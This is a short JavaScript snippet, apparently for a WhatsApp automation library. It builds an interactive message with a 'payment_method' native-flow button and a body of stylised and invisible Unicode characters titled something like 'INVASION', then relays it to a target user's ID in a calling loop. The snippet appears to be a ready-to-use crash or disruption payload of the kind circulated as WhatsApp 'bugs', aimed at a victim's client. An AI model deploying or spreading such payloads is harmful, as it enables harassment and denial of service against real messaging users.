async function sqlinvisible(sock, target) {
  let message = {
    interactiveMessage: {
      body: {
        text: "⎋⭑̤⟅̊༑ ▾ 𝐍͢𝐑ͮ𝐔𝚯ͮ ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯ͮ𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑‣꙱"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_method",
            buttonParamsJson: "{}"
          }
        ]
      }
    }
  };

  await sock.relayMessage(target, message, {
    messageId: null,
    participant: { jid: target },
    userJid: target
  });
}

// <<( The Calling Function )>>
for (let r = 0; r < 1; r++) {
await sqlinvisible(sock, target)
}